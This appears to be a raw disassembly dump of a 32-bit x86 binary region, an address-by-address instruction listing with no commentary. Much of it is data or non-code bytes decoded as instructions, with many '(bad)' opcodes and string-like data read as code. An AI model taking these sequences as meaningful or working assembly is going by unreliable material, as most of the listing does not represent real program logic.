  433292:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433298:	jb     0x4332a9
  43329a:	add    BYTE PTR [edi-0x3f],dl
  43329d:	add    BYTE PTR [ebp-0x75],cl
  4332a0:	mov    esi,eax
  4332a2:	xor    eax,DWORD PTR [eax]
  4332a4:	mov    al,bh
  4332a6:	or     eax,0x4b7284
  4332ab:	xor    al,cl
  4332ad:	mov    ecx,DWORD PTR [ebp-0x4]
  4332b0:	mov    ecx,edi
  4332b2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4332b8:	jb     0x4332c9
  4332ba:	add    BYTE PTR [edi],dh
  4332bc:	enter  0x8500,0x8b
  4332c0:	add    ah,bl
  4332c2:	add    BYTE PTR [eax],al
  4332c4:	inc    ebp
  4332c5:	(bad)  
  4332c6:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4332cd:	mov    esi,DWORD PTR [edx-0x4]
  4332d0:	add    bh,cl
  4332d2:	dec    ebp
  4332d3:	mov    dh,0x8b
  4332d5:	add    esi,DWORD PTR [ebx]
  4332d7:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4332dd:	add    BYTE PTR [eax],al
  4332df:	mov    eax,ecx
  4332e1:	loopne 0x433330
  4332e3:	add    BYTE PTR [ebx-0x757bcc39],cl
  4332e9:	dec    ebx
  4332ea:	or     eax,0x8b7232
  4332ef:	in     al,0xc1
  4332f1:	or     DWORD PTR [ebp-0x31],ecx
  4332f4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4332fb:	xor    dh,BYTE PTR [edx-0x75]
  4332fe:	add    al,dh
  433300:	enter  0x4f09,0xcf
  433304:	inc    ebp
  433305:	mov    WORD PTR [ebx-0x75cdccb5],cs
  43330b:	or     al,BYTE PTR ds:0xe4728b
  433311:	or     DWORD PTR [ebp-0x31],ecx
  433314:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  43331b:	cmp    dh,BYTE PTR [edx+0xf]
  43331e:	add    bl,dl
  433320:	rol    DWORD PTR [eax],0x4d
  433323:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433329:	(bad)  
  43332a:	or     eax,0x4b7284
  43332f:	xor    al,cl
  433331:	mov    ecx,DWORD PTR [ebp-0x20]
  433334:	mov    ecx,DWORD PTR [ecx]
  433336:	xor    ecx,edi
  433338:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43333f:	xor    cl,al
  433341:	mov    ecx,DWORD PTR [edi]
  433343:	fadd   QWORD PTR [ebp+0x9]
  433346:	call   0xffd02e1a
  43334b:	dec    ebx
  43334c:	dec    ebp
  43334d:	xor    bh,BYTE PTR [ebx]
  43334f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  433353:	loopne 0x433351
  433355:	or     edi,eax
  433357:	iret   
  433358:	ret    
  433359:	mov    WORD PTR [ebp+0x4f],es
  43335c:	mov    esi,DWORD PTR [edx]
  43335e:	call   0x8452fa9d
  433363:	(bad)  
  433364:	fwait
  433365:	add    BYTE PTR [edx],dh
  433367:	mov    esi,DWORD PTR [ebx]
  433369:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43336f:	test   BYTE PTR [ebx],dh
  433371:	dec    ebx
  433372:	add    esi,DWORD PTR [edx]
  433374:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  43337a:	dec    edi
  43337c:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  433383:	xor    al,BYTE PTR [ebx]
  433385:	mov    edi,DWORD PTR [ebx]
  433387:	in     al,0x75
  433389:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43338f:	dec    ebx
  433390:	xor    esi,DWORD PTR [edx]
  433392:	lea    ecx,[edx]
  433394:	or     BYTE PTR [ebx+0x900f072],cl
  43339a:	ja     0x43336b
  43339c:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  4333a3:	cmp    ch,al
  4333a5:	jne    0x43339a
  4333a7:	mov    edi,edi
  4333a9:	fadd   QWORD PTR [ebp+0x0]
  4333ac:	mov    eax,edi
  4333ae:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4333b5:	mov    edx,DWORD PTR [ebx]
  4333b7:	in     al,0x45
  4333b9:	or     DWORD PTR [ebx],esi
  4333bb:	iret   
  4333bc:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4333c3:	xor    dl,BYTE PTR [eax-0x75]
  4333c6:	sbb    al,0xe0
  4333c8:	dec    DWORD PTR [ecx]
  4333ca:	mov    ecx,edi
  4333cc:	in     al,dx
  4333cd:	mov    eax,es
  4333cf:	dec    ebx
  4333d0:	mov    DWORD PTR [edx],esi
  4333d2:	fmul   QWORD PTR [edx]
  4333d4:	jne    0x433361
  4333d6:	(bad)  
  4333d7:	(bad)  
  4333d9:	or     DWORD PTR [ebp-0x31],eax
  4333dc:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4333e3:	cmp    bh,bh
  4333e5:	jne    0x43342c
  4333e7:	lea    ecx,[ebx-0x38372750]
  4333ed:	inc    ebx
  4333ef:	mov    eax,ecx
  4333f1:	mov    eax,0xa00c111
  4333f6:	jne    0x43343d
  4333f8:	mov    esi,DWORD PTR [ebx]
  4333fa:	test   al,0x3
  4333fc:	inc    ebp
  4333fd:	mov    DWORD PTR [eax-0xc],edx
  433400:	loop   0x433447
  433402:	push   DWORD PTR [ebx]
  433404:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  43340a:	add    DWORD PTR [eax],eax
  43340c:	mov    eax,edi
  43340e:	lods   al,BYTE PTR ds:[esi]
  43340f:	dec    ebp
  433410:	inc    ebp
  433411:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433417:	retf   
  433418:	mov    edx,ecx
  43341a:	adc    al,0x84
  43341c:	(bad)  
  43341d:	std    
  43341e:	ret    
  43341f:	jmp    FWORD PTR [edi-0x2b7474bb]
  433425:	hlt    
  433426:	rol    edi,0x82
  433429:	ret    
  43342a:	cld    
  43342b:	enter  0x11ff,0x45
  43342f:	inc    ebp
  433430:	pop    edi
  433431:	mov    ebx,DWORD PTR [ebx+0x14]
  433434:	ret    0xc7
  433437:	test   BYTE PTR [ebx+0x4532519b],cl
  43343d:	jmp    0x4333ca
  43343f:	push   0x8
  433441:	call   DWORD PTR [esi]
  433443:	in     al,dx
  433444:	add    BYTE PTR [ebp+0x1],0x50
  433448:	add    bh,ah
  43344a:	add    bh,bh
  43344c:	icebp  
  43344d:	mov    ecx,DWORD PTR [eax]
  43344f:	cld    
  433450:	pop    es
  433451:	dec    ebp
  433452:	shl    DWORD PTR [ebx],0x72
  433455:	add    eax,DWORD PTR [eax]
  433457:	cmp    edx,ecx
  433459:	je     0x43346b
  43345b:	mov    esi,DWORD PTR [ebp-0x4]
  43345e:	inc    edi
  433460:	or     al,0xc3
  433462:	jmp    FWORD PTR [edx-0x18]
  433465:	(bad)  
  433466:	sti    
  433467:	cwde   
  433468:	(bad)  
  433469:	call   0xffa12d74
  43346e:	or     al,0x45
  433470:	push   ebp
  433471:	sub    esp,0x18
  433474:	push   ebx
  433475:	inc    ebp
  433476:	mov    edi,edi
  433478:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43347f:	test   al,0x54
  433481:	inc    ebp
  433482:	push   ecx
  433483:	push   eax
  433484:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  43348a:	add    ah,bh
  43348c:	(bad)  
  43348d:	dec    ebp
  43348e:	add    DWORD PTR [ebx],esi
  433490:	inc    ebp
  433491:	add    ecx,DWORD PTR [ebx+0x74943b]
  433497:	push   0xffffff8b
  433499:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43349f:	add    eax,DWORD PTR [ecx]
  4334a1:	or     BYTE PTR [eax],al
  4334a3:	call   0xff852ca8
  4334a8:	mov    eax,DWORD PTR [ebp+0x14]
  4334ab:	mov    ecx,DWORD PTR [ecx+0x801ac]
  4334b1:	inc    ebp
  4334b2:	dec    ecx
  4334b3:	add    ebp,DWORD PTR [edx+0x14]
  4334b6:	push   0x8b3045
  4334bb:	call   0x33ad8230
  4334c0:	inc    DWORD PTR [ebx]
  4334c2:	mov    DWORD PTR [edi],ecx
  4334c4:	mov    eax,ecx
  4334c6:	or     BYTE PTR [ebp-0x3d],cl
  4334c9:	cmp    eax,edi
  4334cb:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4334d0:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4334d6:	adc    al,0xc9
  4334d8:	inc    ebp
  4334d9:	adc    BYTE PTR [eax+0x55],dl
  4334dc:	jne    0x4334ca
  4334de:	call   0xff54346e
  4334e3:	dec    ebp
  4334e4:	inc    ebp
  4334e5:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4334eb:	add    BYTE PTR [ebx],bh
  4334ed:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4334f1:	push   esp
  4334f2:	or     al,0x51
  4334f4:	dec    ebp
  4334f5:	xor    DWORD PTR [ebx],0xf32039b
  4334fb:	cmp    eax,DWORD PTR [ebp+0x74]
  4334fe:	mov    edi,edi
  433500:	pop    edi
  433501:	adc    BYTE PTR [ebx+0x75],bl
  433504:	ret    0x50
  433507:	mov    edx,DWORD PTR ss:[edi-0x7d]
  43350b:	(bad)  
  43350c:	clc    
  43350d:	mov    esp,ebp
  43350f:	pop    ecx
  433510:	mov    ecx,0xf80085c2
  433515:	mov    ecx,DWORD PTR [ecx+edx*2]
  433518:	push   esi
  433519:	push   esi
  43351a:	(bad)  
  43351b:	lock add DWORD PTR [ebp+0x44],eax
  43351f:	mov    edx,DWORD PTR [eax]
  433521:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433525:	or     BYTE PTR [edi+eax*1+0x51],dl
  433529:	ret    
  43352a:	xor    ebx,DWORD PTR [ebx+0x37232be]
  433530:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433536:	or     al,0x80
  433538:	jge    0x43353b
  43353a:	mov    DWORD PTR [eax],eax
  43353c:	and    al,0x8
  43353e:	cmp    DWORD PTR [ebp+0x10],eax
  433541:	mov    edx,DWORD PTR [esi]
  433543:	xchg   esp,eax
  433544:	dec    esp
  433545:	add    BYTE PTR [eax],dl
  433547:	mov    ecx,edx
  433549:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43354d:	dec    ebp
  43354e:	into   
  43354f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433555:	mov    edx,DWORD PTR [eax+0x14]
  433558:	das    
  433559:	add    al,0x45
  43355b:	add    BYTE PTR [ebp+0x0],dh
  43355e:	mov    edi,edi
  433560:	and    al,0x50
  433562:	mov    eax,DWORD PTR [eax]
  433564:	and    al,0xd1
  433566:	xor    eax,DWORD PTR [esi]
  433568:	lea    eax,[ebp+0x8]
  43356b:	xor    esi,DWORD PTR [edx+0x3]
  43356e:	add    BYTE PTR [ecx+0x4510fc44],cl
  433574:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  43357a:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433584:	cmp    al,0xff
  433586:	pushf  
  433587:	mov    edi,edi
  433589:	or     BYTE PTR [esi+ecx*1],cl
  43358c:	jne    0x433551
  43358e:	call   0xc355a
  433593:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433597:	mov    ebx,DWORD PTR [eax]
  433599:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  43359d:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  4335a5:	pop    esi
  4335a6:	and    al,0xc9
  4335a8:	call   DWORD PTR [eax]
  4335aa:	and    al,0x55
  4335ac:	call   0x28349d
  4335b1:	add    DWORD PTR [eax+edx*1+0xc],0x31
  4335b6:	clc    
  4335b7:	pushf  
  4335b8:	dec    DWORD PTR [ecx+0x57892474]
  4335be:	jmp    0x433601
  4335c0:	and    al,0x89
  4335c2:	and    al,0x24
  4335c4:	or     BYTE PTR [ebx-0x45ebdbe8],cl
  4335ca:	dec    DWORD PTR [eax]
  4335cc:	and    al,0x7
  4335ce:	pop    esi
  4335cf:	cli    
  4335d0:	in     eax,0x9b
  4335d2:	ret    0x32
  4335d5:	add    eax,edx
  4335d7:	mov    DWORD PTR [ebx+0x688b8924],ebx
  4335dd:	or     al,0xf8
  4335df:	jl     0x43365e
  4335e1:	adc    al,0x9c
  4335e3:	dec    ebp
  4335e4:	push   0xff8b7575
  4335e9:	and    al,0xff
  4335eb:	xor    edi,edi
  4335ed:	mov    esi,DWORD PTR [esp-0x75]
  4335f1:	add    ecx,DWORD PTR [ebx+0x4cca0c0f]
  4335f7:	or     bl,ch
  4335f9:	cmp    DWORD PTR [eax],edx
  4335fb:	sbb    al,0x44
  4335fd:	or     BYTE PTR [eax+edx*1-0x7c],cl
  433601:	xor    ah,BYTE PTR [eax*4-0x7a8accf2]
  433608:	or     BYTE PTR [ecx*4+0x5d5fbf74],ah
  43360f:	test   eax,0x83001010
  433614:	dec    eax
  433615:	adc    BYTE PTR [eax],al
  433617:	adc    edi,DWORD PTR [edx+0x10]
  43361a:	add    cl,bh
  43361c:	jae    0x43362e
  43361e:	add    BYTE PTR [ebx-0x4bffefb4],dh
  433624:	pop    eax
  433625:	adc    BYTE PTR [eax],al
  433627:	fidiv  DWORD PTR [ebp+0x10]
  43362a:	add    dh,bl
  43362c:	movups xmm0,XMMWORD PTR [eax]
  43362f:	popf   
  433630:	push   cs
  433631:	adc    BYTE PTR [eax],al
  433633:	ins    DWORD PTR es:[edi],dx
  433634:	or     BYTE PTR [eax],dl
  433636:	add    BYTE PTR [ebx+eiz*2+0x360f0010],cl
  43363d:	inc    ebx
  43363e:	add    BYTE PTR [ebx],dl
  433640:	ss inc ebx
  433642:	add    BYTE PTR [edi],dl
  433644:	ss inc ebx
  433646:	add    BYTE PTR [ebx],bl
  433648:	ss inc ebx
  43364a:	add    BYTE PTR [edi],bl
  43364c:	ss inc ebx
  43364e:	add    BYTE PTR [ebx],ah
  433650:	ss inc ebx
  433652:	add    BYTE PTR [edi],ah
  433654:	ss inc ebx
  433656:	add    BYTE PTR [ebx],ch
  433658:	ss inc ebx
  43365a:	add    BYTE PTR [edi],ch
  43365c:	ss inc ebx
  43365e:	add    BYTE PTR [ebx],dh
  433660:	ss inc ebx
  433662:	add    BYTE PTR [edi],dh
  433664:	ss inc ebx
  433666:	add    BYTE PTR [ebx-0x73ffefdd],bh
  43366c:	cmp    al,0x10
  43366e:	add    BYTE PTR [ebx+0x30],cl
  433671:	adc    BYTE PTR [eax],al
  433673:	sub    al,0xc
  433675:	adc    BYTE PTR [eax],al
  433677:	push   ds
  433678:	adc    BYTE PTR ds:[eax],al
  43367b:	mov    bh,0x56
  43367d:	adc    BYTE PTR [eax],al
  43367f:	adc    eax,DWORD PTR [eax+edx*1+0x0]
  433683:	cmp    al,0x4f
  433685:	adc    BYTE PTR [eax],al
  433687:	addr16 ss inc ebx
  43368a:	add    BYTE PTR [ebx+0x36],ch
  43368d:	inc    ebx
  43368e:	add    BYTE PTR [edi+0x36],ch
  433691:	inc    ebx
  433692:	add    BYTE PTR [ebx+0x36],dh
  433695:	inc    ebx
  433696:	add    BYTE PTR [edi+0x36],dh
  433699:	inc    ebx
  43369a:	add    BYTE PTR [ebx+0x36],bh
  43369d:	inc    ebx
  43369e:	add    BYTE PTR [edi+0x36],bh
  4336a1:	inc    ebx
  4336a2:	add    BYTE PTR [ebx-0x23ffbcca],al
  4336a8:	pop    esp
  4336a9:	adc    BYTE PTR [eax],al
  4336ab:	jle    0x4336cd
  4336ad:	adc    BYTE PTR [eax],al
  4336af:	cld    
  4336b0:	dec    edx
  4336b1:	adc    BYTE PTR [eax],al
  4336b3:	add    al,0xb
  4336b5:	adc    BYTE PTR [eax],al
  4336b7:	push   ebx
  4336b8:	ins    DWORD PTR es:[edi],dx
  4336b9:	adc    BYTE PTR [eax],al
  4336bb:	fs jl  0x4336ce
  4336be:	add    BYTE PTR [edx+0x42001015],ah
  4336c4:	jge    0x4336d6
  4336c6:	add    BYTE PTR [edi-0x54ffbcca],ah
  4336cc:	ss inc ebx
  4336ce:	add    BYTE PTR [edi-0x4cffbcca],ch
  4336d4:	ss inc ebx
  4336d6:	add    BYTE PTR [edi-0x44ffbcca],dh
  4336dc:	ss inc ebx
  4336de:	add    BYTE PTR [edi-0x3cffbcca],bh
  4336e4:	ss inc ebx
  4336e6:	add    BYTE PTR [edi+0x2300103a],ah
  4336ec:	aas    
  4336ed:	adc    BYTE PTR [eax],al
  4336ef:	jne    0x4336fc
  4336f1:	adc    BYTE PTR [eax],al
  4336f3:	fldenv [esi]
  4336f5:	adc    BYTE PTR [eax],al
  4336f7:	xchg   esp,eax
  4336f8:	push   0x10
  4336fa:	add    bl,ah
  4336fc:	pop    eax
  4336fd:	adc    BYTE PTR [eax],al
  4336ff:	in     al,0x2f
  433701:	adc    BYTE PTR [eax],al
  433703:	leave  
  433704:	sbb    DWORD PTR [eax],edx
  433706:	add    bh,ah
  433708:	ss inc ebx
  43370a:	add    bl,ch
  43370c:	ss inc ebx
  43370e:	add    bh,ch
  433710:	ss inc ebx
  433712:	add    bl,dh
  433714:	ss inc ebx
  433716:	add    bh,dh
  433718:	ss inc ebx
  43371a:	add    bl,bh
  43371c:	ss inc ebx
  43371e:	add    bh,bh
  433720:	ss inc ebx
  433722:	add    BYTE PTR [ebx],al
  433724:	aaa    
  433725:	inc    ebx
  433726:	add    BYTE PTR [ebp+0x1d001062],bh
  43372c:	adc    BYTE PTR [eax],dl
  43372e:	add    BYTE PTR [edi+0x51],dl
  433731:	adc    BYTE PTR [eax],al
  433733:	dec    eax
  433734:	ins    DWORD PTR es:[edi],dx
  433735:	adc    BYTE PTR [eax],al
  433737:	mov    eax,DWORD PTR [edi]
  433739:	adc    BYTE PTR [eax],al
  43373b:	mov    ah,0x7
  43373d:	adc    BYTE PTR [eax],al
  43373f:	ror    DWORD PTR [esi],1
  433741:	adc    BYTE PTR [eax],al
  433743:	pop    edi
  433744:	inc    ebp
  433745:	adc    BYTE PTR [eax],al
  433747:	daa    
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [ebx],ch
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [edi],ch
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [ebx],dh
  433754:	aaa    
  433755:	inc    ebx
  433756:	add    BYTE PTR [edi],dh
  433758:	aaa    
  433759:	inc    ebx
  43375a:	add    BYTE PTR [ebx],bh
  43375c:	aaa    
  43375d:	inc    ebx
  43375e:	add    BYTE PTR [edi],bh
  433760:	aaa    
  433761:	inc    ebx
  433762:	add    BYTE PTR [ebx+0x37],al
  433765:	inc    ebx
  433766:	add    BYTE PTR [ecx+0x36],cl
  433769:	push   eax
  43376a:	pop    edi
  43376b:	ss inc ebx
  43376d:	ss pop edx
  43376f:	xor    ebx,DWORD PTR [edi+0x52]
  433772:	add    BYTE PTR [edi+ecx*2+0x32],dl
  433776:	pop    edi
  433777:	dec    esi
  433778:	dec    esp
  433779:	dec    eax
  43377a:	xor    esi,DWORD PTR [edx]
  43377c:	pop    edi
  43377d:	xor    al,0x4b
  43377f:	add    BYTE PTR [eax+0x49],cl
  433782:	push   ebp
  433783:	xor    al,0x5f
  433785:	dec    esp
  433786:	inc    edx
  433787:	dec    ecx
  433788:	cmp    DWORD PTR [edi+ebx*2],esi
  43378b:	pop    ecx
  43378c:	inc    edi
  43378d:	add    BYTE PTR [eax+0x50],bl
  433790:	dec    eax
  433791:	pop    edi
  433792:	push   ebp
  433793:	push   ecx
  433794:	inc    edi
  433795:	xor    cl,BYTE PTR [edx+0x38]
  433798:	push   esi
  433799:	add    BYTE PTR [ebx+0x4a],al
  43379c:	push   edx
  43379d:	pop    edi
  43379e:	dec    edi
  43379f:	dec    eax
  4337a0:	dec    edi
  4337a1:	dec    edi
  4337a2:	dec    edx
  4337a3:	add    BYTE PTR [ecx+0x52],al
  4337a6:	cmp    DWORD PTR [edi+0x56],ebx
  4337a9:	aaa    
  4337aa:	dec    esp
  4337ab:	cmp    DWORD PTR [ebx+0x5f],eax
  4337ae:	push   edx
  4337af:	inc    esp
  4337b0:	add    BYTE PTR [ecx+0x37],bl
  4337b3:	inc    esp
  4337b4:	pop    edi
  4337b5:	dec    ecx
  4337b6:	xor    esi,DWORD PTR [edi]
  4337b8:	xor    DWORD PTR [edi+0x49],ebx
  4337bb:	push   esp
  4337bc:	xor    eax,DWORD PTR [eax]
  4337be:	push   edx
  4337bf:	xor    BYTE PTR [eax+0x5f],bl
  4337c2:	dec    eax
  4337c3:	push   edi
  4337c4:	inc    esi
  4337c5:	xor    DWORD PTR [edi+0x5f],edx
  4337c8:	cmp    BYTE PTR [ebx+0x37],dl
  4337cb:	add    BYTE PTR [esi+0x42],dl
  4337ce:	dec    ecx
  4337cf:	xor    ebx,DWORD PTR [edi+0x45]
  4337d2:	xor    BYTE PTR [ebp+0x5f],cl
  4337d5:	xor    al,0x34
  4337d7:	xor    BYTE PTR [edx+0x5f],cl
  4337da:	inc    edi
  4337db:	add    BYTE PTR [edx+0x57],dl
  4337de:	xor    ebx,DWORD PTR [edi+0x31]
  4337e1:	dec    edx
  4337e2:	push   edi
  4337e3:	xor    eax,0x4d435f
  4337e8:	dec    ecx
  4337e9:	xor    eax,0x36365f39
  4337ee:	dec    eax
  4337ef:	xor    BYTE PTR [eax],al
  4337f1:	dec    edi
  4337f2:	inc    ebx
  4337f3:	push   edi
  4337f4:	pop    edi
  4337f5:	inc    edi
  4337f6:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  4337fb:	add    BYTE PTR [edx+0x0],al
  4337fe:	pop    eax
  4337ff:	add    BYTE PTR [edi+0x0],al
  433802:	add    BYTE PTR ss:[edi+0x0],bl
  433806:	push   esi
  433807:	add    BYTE PTR [ebx+0x0],al
  43380a:	dec    esi
  43380b:	add    BYTE PTR [eax+eax*1+0x0],al
  43380f:	add    BYTE PTR [edi+0x0],cl
  433812:	dec    ebp
  433813:	add    BYTE PTR [edi+0x0],al
  433816:	xor    eax,DWORD PTR [eax]
  433818:	pop    edi
  433819:	add    BYTE PTR [eax+eax*1],dh
  43381c:	dec    esi
  43381d:	add    BYTE PTR [edx+0x0],bl
  433820:	cmp    BYTE PTR [eax],al
  433822:	pop    edi
  433823:	add    BYTE PTR [eax+0x0],bl
  433826:	cmp    BYTE PTR [eax],al
  433828:	add    BYTE PTR [eax],al
  43382a:	push   edx
  43382b:	add    BYTE PTR [eax+0x0],bl
  43382e:	push   ecx
  43382f:	add    BYTE PTR [edi+0x0],bl
  433832:	dec    esp
  433833:	add    BYTE PTR [edx+0x0],dl
  433836:	dec    ecx
  433837:	add    BYTE PTR [edi+0x0],cl
  43383a:	inc    esp
  43383b:	add    BYTE PTR [edi+0x0],bl
  43383e:	dec    edi
  43383f:	add    BYTE PTR [ebx],dh
  433841:	add    BYTE PTR [eax+eax*1+0x0],al
  433845:	add    BYTE PTR [ebx+0x0],al
  433848:	push   eax
  433849:	add    BYTE PTR [ebp+0x0],al
  43384c:	pop    edi
  43384d:	add    BYTE PTR ds:0x39004500,dh
  433853:	add    BYTE PTR [edi+0x0],bl
  433856:	push   esi
  433857:	add    BYTE PTR [eax],al
  433859:	add    BYTE PTR [edi+0x0],al
  43385c:	dec    esi
  43385d:	add    BYTE PTR [esi+0x0],dl
  433860:	pop    edi
  433861:	add    BYTE PTR [edi+0x0],al
  433864:	push   esp
  433865:	add    BYTE PTR [eax+0x0],cl
  433868:	xor    al,BYTE PTR [eax]
  43386a:	xor    DWORD PTR [eax],eax
  43386c:	pop    edi
  43386d:	add    BYTE PTR [edi+0x0],cl
  433870:	add    BYTE PTR ss:[ebx],dh
  433873:	add    BYTE PTR [eax],al
  433875:	add    BYTE PTR [eax+eax*1+0x45],al
  433879:	add    BYTE PTR [ecx+0x0],cl
  43387c:	pop    edi
  43387d:	add    BYTE PTR [edx+0x0],dl
  433880:	dec    eax
  433881:	add    BYTE PTR [eax+eax*1],dh
  433884:	dec    eax
  433885:	add    BYTE PTR [eax],al
  433887:	add    BYTE PTR [eax],al
  433889:	push   edx
  43388a:	push   ebx
  43388b:	inc    esp
  43388c:	push   ebx
  43388d:	rol    esp,0xd
  433890:	xor    esi,DWORD PTR [ebp*8+0x8a84209]
  433897:	jnp    0x43383b
  433899:	or     cl,BYTE PTR [esi]
  43389b:	pop    eax
  43389c:	add    al,0xe
  43389e:	add    BYTE PTR [eax],al
  4338a0:	add    BYTE PTR [ecx+0x3a],dl
  4338a3:	pop    esp
  4338a4:	js     0x4338fe
  4338a6:	ins    DWORD PTR es:[edi],dx
  4338a7:	arpl   WORD PTR [esi+0x76],sp
  4338aa:	addr16 jp 0x433921
  4338ad:	pop    esp
  4338ae:	inc    ebp
  4338af:	inc    esi
  4338b0:	dec    edx
  4338b1:	bound  ebp,QWORD PTR [edx+0x67]
  4338b4:	popa   
  4338b5:	push   0x6c776a5c
  4338ba:	bound  esp,QWORD PTR [eax+ebp*2+0x70]
  4338be:	popa   
  4338bf:	bound  esi,QWORD PTR [edi+0x65]
  4338c2:	cs jo  0x433929
  4338c5:	bound  eax,QWORD PTR [eax]
	...
